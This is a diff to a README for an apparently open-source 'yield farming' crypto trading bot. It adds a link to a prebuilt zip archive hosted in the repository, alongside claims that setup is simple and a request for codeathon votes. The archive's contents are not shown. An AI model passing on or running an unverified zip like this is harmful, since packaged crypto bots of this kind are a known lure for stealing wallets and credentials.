@@ -7,7 +7,9 @@ Configuring the bot is super simple and straightforward. There's nothing install
 This is open source and free all I ask is when you use this and you're happy with it if you happen to go to the codeathon please vote for me and this program. 
 
 
+You can download the zip file of the bot here
 
+https://github.com/coolnerdcoder/JavaScript-Yield-Farming-Bot-V4-with-StopLoss/raw/main/Javascript-Yield-Farming-Bot-V4-with-StopLoss.zip
 
 How to configure it:
 
